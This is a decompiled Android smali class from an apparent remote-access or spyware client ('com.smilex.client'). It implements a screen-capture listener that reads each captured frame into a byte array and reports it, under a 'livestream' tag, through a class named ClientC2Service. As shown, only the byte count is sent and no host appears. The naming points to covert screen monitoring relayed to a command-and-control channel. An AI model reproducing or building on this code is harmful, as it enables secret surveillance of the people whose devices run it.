.class Lcom/smilex/client/services/LiveStreamService$1;
.super Ljava/lang/Object;
.source "LiveStreamService.java"

.implements Landroid/media/ImageReader$OnImageAvailableListener;

.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/smilex/client/services/LiveStreamService;->startScreenCapture(Landroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = "1"
.end annotation

.field final synthetic this$0:Lcom/smilex/client/services/LiveStreamService;

.method constructor <init>(Lcom/smilex/client/services/LiveStreamService;)V
    .registers 2
    iput-object p1, p0, Lcom/smilex/client/services/LiveStreamService$1;->this$0:Lcom/smilex/client/services/LiveStreamService;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public onImageAvailable(Landroid/media/ImageReader;)V
    .registers 7
    .param p1, "reader"

    invoke-virtual {p1}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;
    move-result-object v0

    if-eqz v0, :end_method

    :try_start
    invoke-virtual {v0}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;
    move-result-object v1

    const/4 v2, 0x0
    aget-object v1, v1, v2

    invoke-virtual {v1}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;
    move-result-object v1

    invoke-virtual {v1}, Ljava/nio/ByteBuffer;->remaining()I
    move-result v2
    new-array v2, v2, [B
    invoke-virtual {v1, v2}, Ljava/nio/ByteBuffer;->get([B)V

    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
    const-string v4, "screencap="
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    array-length v4, v2
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    const-string v4, "bytes"
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    const-string v4, "livestream"
    invoke-static {v4, v3}, Lcom/smilex/client/services/ClientC2Service;->sendCommand(Ljava/lang/String;Ljava/lang/String;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch

    :catch
    invoke-virtual {v0}, Landroid/media/Image;->close()V

    :end_method
    return-void
.end method
